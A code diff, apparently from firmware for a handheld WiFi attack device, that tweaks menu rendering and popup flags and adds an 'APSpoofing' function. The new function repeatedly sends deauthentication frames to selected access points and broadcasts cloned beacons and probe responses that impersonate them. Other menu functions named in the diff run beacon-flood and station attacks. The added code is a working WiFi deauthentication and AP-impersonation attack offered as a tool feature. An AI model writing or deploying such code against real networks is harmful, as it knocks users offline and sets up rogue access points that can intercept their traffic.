@@ -88,7 +88,7 @@ int nx::menu::calcRectX(int rectWidth) {
 }
 
 int nx::menu::calcTextX(int rectX, int rectWidth, int textWidth) {
-  return rectX + (rectWidth - textWidth) / 2;
+  return rectX + (rectWidth - textWidth) / 2 + 2;
 }
 
 int nx::menu::calcTextY(int y) {
@@ -138,8 +138,8 @@ void nx::menu::drawBorder() {
 
 void nx::menu::renderRoundRect(int x, int y, int w, int h) {
   display.setDrawColor(1);
-  display.drawRFrame(x, y, w, h, cornerRadius);
-  display.drawRFrame(x + 1, y + 1, w - 2, h - 2, cornerRadius - 1);
+  display.drawRFrame(x + 2, y , w, h, cornerRadius);
+  display.drawRFrame(x + 3, y + 1, w - 2, h - 2, cornerRadius - 1);
 }
 
 void nx::menu::renderCheckbox(int x, int y, bool checked) {
@@ -608,7 +608,10 @@ void nx::menu::renderPopup(const std::string& ctx){
   int textY = popupY + calcTextY(0) + 2;
   display.drawStr(textX, textY, ctx.c_str());
   display.sendBuffer();
-  delay(500);
+
+  fadeIn();
+
+  delay(700);
 }
 
 void nx::menu::drawSubMenu(const std::string& title, bool progressFlag, bool scanFlag){
@@ -716,20 +719,15 @@ void nx::menu::executeSelectedAttack(const char* attackType, std::function<void(
     popupFlag = true;
     return;
   }
-  popupFlag = false;
   if(selectedAPs.empty()) {
     renderPopup("No APs Selected");
+    popupFlag = true;
     return;
   }
-  
+  popupFlag = false;
   int selectedCount = 0;
   for(bool sel : selectedAPs) if(sel) selectedCount++;
-  
-  if(selectedCount == 0) {
-    renderPopup("No APs Selected");
-    return;
-  }
-  
+
   char title[32];
   snprintf(title, sizeof(title), "%s %d APs", attackType, selectedCount);
   
@@ -800,10 +798,10 @@ void nx::menu::attackSelectedBySTAs(){
     popupFlag = true;
     return;
   }
-  popupFlag = false;
   
   if(selectedSTAs.empty()) {
     renderPopup("No STAs Selected");
+    popupFlag = true;
     return;
   }
   
@@ -812,9 +810,10 @@ void nx::menu::attackSelectedBySTAs(){
   
   if(selectedCount == 0) {
     renderPopup("No STAs Selected");
+    popupFlag = true;
     return;
   }
-  
+  popupFlag = false;
   char title[32];
   snprintf(title, sizeof(title), "Attack %d STAs", selectedCount);
   
@@ -832,6 +831,61 @@ void nx::menu::attackSelectedBySTAs(){
       }
     }
     
+    if(btn.btnPress(btnBack)) break;
+  }
+}
+
+void nx::menu::APSpoofing(){
+  //1.Beacon
+  //2.probe resp
+
+  uint8_t destMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  if(channelAPMap.empty()) {
+    renderPopup("Scan First");
+    popupFlag = true;
+    return;
+  }
+  if(selectedAPs.empty() || std::count(selectedAPs. begin(), selectedAPs.end(), true) == 0) {
+    renderPopup("No APs Selected");
+    popupFlag = true;
+    return;
+  }
+  popupFlag = false;
+  std::vector<BSSIDInfo> selectedAPList;
+  std::vector<uint8_t> chs;
+
+  unsigned long lastDeauth = millis();
+
+  size_t idx = 0;
+  for(auto& entry : channelAPMap) {
+    uint8_t channel = entry.first;
+    chs.push_back(channel);
+    for(auto& apInfo : entry.second) {
+      if(idx < selectedAPs.size() && selectedAPs[idx]) {
+        selectedAPList.push_back(apInfo);
+      }
+      idx++;
+    }
+  }
+  
+  while(true){
+    drawSubMenu("C.I");
+    unsigned long currentTime = millis();
+    
+    if(currentTime - lastDeauth >= 10000){ // 10 sec
+      for(const BSSIDInfo& ap : selectedAPList){
+        for(const uint8_t ch : chs){
+          tx.txDeauthFrameBSSID(ap.bssid.data(),ch);
+        }
+      }
+    }
+    
+    for(const uint8_t ch: tx.channelList){
+      for(const BSSIDInfo& ap : selectedAPList){
+        tx.txBeaconFrame(ap.ssid.c_str(),ch,ap.bssid.data(),ap.encrypted);
+        tx.txProbeResponse(ap.bssid.data(),ap.ssid.c_str(),ch,destMac);
+      }
+    }
     if(btn.btnPress(btnBack)) break;
   }
 }
@@ -988,7 +1042,6 @@ void nx::menu::beaconAllSSID() {
     popupFlag = true;
     return;
   }
-  popupFlag = false;
   std::vector<const BSSIDInfo*> allAPs;
   for(auto& entry :channelAPMap) {
     for(auto& apInfo : entry.second) {
@@ -997,8 +1050,10 @@ void nx::menu::beaconAllSSID() {
   }
   if(allAPs.empty()) {
     renderPopup("No SSIDs Found");
+    popupFlag = true;
     return;
   }
+  popupFlag = false;
   char title[32];
   snprintf(title, sizeof(title), "Beacon %d SSIDs", (int)allAPs.size());
   executeBeaconAttack(allAPs, std::string(title));
@@ -1010,12 +1065,12 @@ void nx::menu::beaconSSIDDupe() {
     popupFlag = true;
     return;
   }
-  popupFlag = false;
   if(selectedAPs.empty() || std::count(selectedAPs. begin(), selectedAPs.end(), true) == 0) {
     renderPopup("No APs Selected");
+    popupFlag = true;
     return;
   }
-  
+  popupFlag = false;
   std::vector<const BSSIDInfo*> selectedAPList;
   size_t idx = 0;
   for(auto& entry : channelAPMap) {
@@ -1121,8 +1176,10 @@ void nx::menu::beaconCustomPrefix(const std::string& prefix){
 void nx::menu::executeBeaconAttack(const std::vector<const BSSIDInfo*>& apList, const std::string& title){
   if(apList.empty()){
     renderPopup("No APs to Attack");
+    popupFlag=true;
     return;
   }
+  popupFlag = false;
   std::vector<std::string> allSSIDs;
   std::vector<std::array<uint8_t,6>> allBSSIDs;
   std::vector<uint8_t> allChannels;
